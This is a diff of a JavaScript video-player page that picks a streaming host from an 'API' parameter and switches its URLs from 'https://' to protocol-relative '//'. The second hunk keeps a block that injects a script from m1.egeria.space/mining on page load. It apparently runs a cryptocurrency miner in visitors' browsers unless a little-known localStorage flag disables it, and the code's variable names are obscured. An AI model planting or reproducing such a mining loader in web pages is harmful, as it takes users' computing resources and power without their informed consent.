@@ -9,13 +9,13 @@ document.addEventListener('DOMContentLoaded', function() {
         var x2 = null;
 
         if (x1.get('API') === 'CUSTOM') {
-            x2 = 'https://' + x1.get('LINK');
+            x2 = '//' + x1.get('LINK');
         } else if (x1.get('API') === 'MOONWALK') {
-            x2 = 'https://moonwalk.egeria.space' + x1.get('LINK');
+            x2 = '//moonwalk.egeria.space' + x1.get('LINK');
         } else if (x1.get('API') === 'HDGO') {
-            x2 = 'https://hdgo.egeria.space' + x1.get('LINK');
+            x2 = '//hdgo.egeria.space' + x1.get('LINK');
         } else if (x1.get('API') === 'KODIK') {
-            x2 = 'https://kodik.cc' + x1.get('LINK');
+            x2 = '//kodik.cc' + x1.get('LINK');
         } else {
             document.body.innerText = 'Неверный параметр API.';
             return;
@@ -36,7 +36,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 localStorage.getItem('DisableMining') === null
             )) {
             var x4 = document.createElement('script');
-            x4.setAttribute('src', 'https://m1.egeria.space/mining');
+            x4.setAttribute('src', '//m1.egeria.space/mining');
             x4.setAttribute('async', '');
             document.body.appendChild(x4);
         }
